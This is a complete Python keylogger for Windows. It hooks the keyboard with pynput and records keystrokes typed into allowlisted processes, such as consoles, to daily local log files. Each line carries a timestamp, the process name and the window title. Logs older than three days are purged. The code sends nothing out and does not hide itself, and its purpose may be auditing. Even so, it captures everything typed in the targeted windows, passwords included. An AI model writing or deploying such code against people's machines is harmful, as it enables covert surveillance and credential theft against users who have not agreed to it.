import os
import sys
import json
import logging
import ctypes
from ctypes import wintypes
from datetime import datetime, timedelta
import win32gui
import win32process
import psutil
from pynput import keyboard


def load_config():
    """
    Загружает конфигурацию из config.json рядом с EXE файлом.
    """
    try:
        if getattr(sys, 'frozen', False):
            # Для EXE: config рядом с исполняемым файлом
            base_dir = os.path.dirname(sys.executable)
            config_path = os.path.join(base_dir, 'config', 'config.json')
        else:
            # Для Python: config в корне проекта
            base_dir = os.path.dirname(os.path.abspath(__file__))
            config_path = os.path.join(base_dir, '..', '..', 'config', 'config.json')

        config_path = os.path.normpath(config_path)

        with open(config_path, 'r', encoding='utf-8') as f:
            return json.load(f)

    except Exception as e:
        logging.exception("Failed to load config.json")
        return {}  # Возвращаем пустой словарь при ошибке


def get_base_dir():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))


# Загружаем конфиг
config = load_config()
ALLOWED_PROCESSES = [p.lower() for p in config.get("allowed_processes", [])]
READABLE_KEYS = {
    getattr(keyboard.Key, k, None): v
    for k, v in config.get("readable_keys", {}).items()
}

# Инициализация Windows API функций
user32 = ctypes.WinDLL('user32', use_last_error=True)
GetKeyboardLayout = user32.GetKeyboardLayout
GetKeyboardLayout.restype = wintypes.HKL
MapVirtualKeyEx = user32.MapVirtualKeyExW
ToUnicodeEx = user32.ToUnicodeEx

EN_LAYOUT = 0x4090409  # en-US

pressed_keys = set()


def get_log_dir():
    """
    Возвращает путь к папке logs.
    """
    if getattr(sys, 'frozen', False):
        # Для EXE: logs рядом с исполняемым файлом
        base_dir = os.path.dirname(sys.executable)
        log_dir = os.path.join(base_dir, 'logs')
    else:
        # Для Python: logs в корне проекта
        base_dir = os.path.dirname(os.path.abspath(__file__))
        log_dir = os.path.join(base_dir, '..', '..', 'logs')

    # Нормализуем путь
    log_dir = os.path.normpath(log_dir)

    # Создаем папку если ее нет
    os.makedirs(log_dir, exist_ok=True)
    return log_dir


def get_log_file_path():
    """
    Возвращает полный путь к файлу лога.
    """
    log_dir = get_log_dir()
    date_str = datetime.now().strftime("%Y-%m-%d")
    return os.path.join(log_dir, f"{date_str}_keylog.txt")


def cleanup_old_logs():
    log_dir = get_log_dir()
    cutoff = datetime.now() - timedelta(days=3)
    for fname in os.listdir(log_dir):
        try:
            file_path = os.path.join(log_dir, fname)
            if os.path.isfile(file_path):
                # Получаем дату создания файла
                creation_time = datetime.fromtimestamp(os.path.getctime(file_path))
                if creation_time < cutoff:
                    os.remove(file_path)
        except Exception:
            continue


# ─── UTILS ──────────────────────────────────────────────────────
def get_active_console_info():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        proc = psutil.Process(pid)
        proc_name = proc.name().lower()
        if proc_name in ALLOWED_PROCESSES:
            window_title = win32gui.GetWindowText(hwnd)
            return proc_name, window_title
    except Exception:
        pass
    return None, None


def get_en_char_from_key(key):
    if key in READABLE_KEYS:
        return READABLE_KEYS[key]

    try:
        # Получаем виртуальный ключ
        if hasattr(key, 'vk'):
            vk = key.vk
        elif hasattr(key, 'value') and hasattr(key.value, 'vk'):
            vk = key.value.vk
        else:
            return f"[{key}]"

        scan_code = MapVirtualKeyEx(vk, 0, EN_LAYOUT)
        buf = ctypes.create_unicode_buffer(8)
        keystate = (ctypes.c_byte * 256)()
        result = ToUnicodeEx(vk, scan_code, keystate, buf, len(buf) - 1, 0, EN_LAYOUT)

        if result > 0:
            return buf.value
        else:
            return f"[{key}]"
    except Exception:
        return f"[{key}]"


# ─── MAIN LOGGER ────────────────────────────────────────────────
def start_keylogger():
    cleanup_old_logs()

    current_proc = None
    current_title = None
    current_line = ""
    last_time = ""
    log_file_path = get_log_file_path()

    def write_line(line):
        try:
            with open(log_file_path, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except Exception:
            logging.exception("Failed to write keylog")

    def flush_line():
        nonlocal current_line
        if current_line.strip():
            write_line(current_line)
        current_line = ""

    def on_press(key):
        nonlocal current_proc, current_title, current_line, last_time

        if key in pressed_keys:
            return
        pressed_keys.add(key)

        proc_name, window_title = get_active_console_info()
        if not proc_name:
            return

        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key_str = get_en_char_from_key(key)

        if proc_name != current_proc or window_title != current_title:
            flush_line()
            current_proc, current_title = proc_name, window_title
            last_time = now

        if not current_line:
            current_line = f"{now} - [{proc_name}] - \"{window_title}\" - "

        if key == keyboard.Key.enter:
            flush_line()
            return

        current_line += key_str

    def on_release(key):
        pressed_keys.discard(key)
        if key == keyboard.Key.esc:
            flush_line()
            return False

    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception:
        logging.exception("Keylogger crashed")


if __name__ == "__main__":
    start_keylogger()